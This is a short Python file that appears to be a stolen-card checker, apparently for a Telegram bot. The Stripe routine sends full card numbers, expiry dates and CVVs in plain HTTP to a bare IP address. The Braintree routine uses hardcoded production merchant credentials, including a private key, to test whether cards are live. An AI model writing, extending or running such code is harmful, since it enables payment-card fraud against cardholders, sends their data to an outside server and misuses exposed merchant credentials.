import time
import requests
import random
import re
import braintree

# ---------- Stripe Integration ----------
def Tele_stripe(ccx):
    ccx = ccx.strip()
    # Use the provided endpoint for Stripe auth (only for auth, not charging)
    url = f"http://46.202.88.147:5000/stripe={ccx}"
    try:
        response = requests.get(url, timeout=15)
        stripe_json = response.json()
    except Exception as e:
        return {"error": {"message": f"Stripe error: {e}"}}
    if "data" in stripe_json and "result" in stripe_json["data"]:
        if "APPROVED" in stripe_json["data"]["result"]:
            stripe_json["succeeded"] = True
        else:
            stripe_json["succeeded"] = False
    return stripe_json

# ---------- Braintree Integration ----------
gateway = braintree.BraintreeGateway(
    braintree.Configuration(
        environment=braintree.Environment.Production,
        merchant_id="4p375ykt729j5wwz",
        public_key="jgy6kf45jny63c9k",
        private_key="72803e034e66d3f0dd3c336a0801c659"
    )
)

def Tele_braintree(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return {"error": {"message": "Invalid card format. Use number|MM|YY|CVV."}}
    number, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    expiration_date = f"{mm}/{yy}"
    try:
        result = gateway.credit_card.create({
            "customer_id": "test_customer",  # Ensure this customer exists in production or create one as needed
            "number": number,
            "expiration_date": expiration_date,
            "cvv": cvv
        })
    except Exception as e:
        return {"error": {"message": f"Braintree error: {e}"}}
    if result.is_success:
        return {"succeeded": True, "id": result.credit_card.token}
    else:
        return {"error": {"message": result.message}}

# ---------- Gateway Selector ----------
def Tele_gateway(gateway, ccx):
    gateway = gateway.lower()
    if gateway == "stripe":
        return Tele_stripe(ccx)
    elif gateway == "braintree":
        return Tele_braintree(ccx)
    else:
        return {"error": {"message": "Invalid gateway specified."}}
        
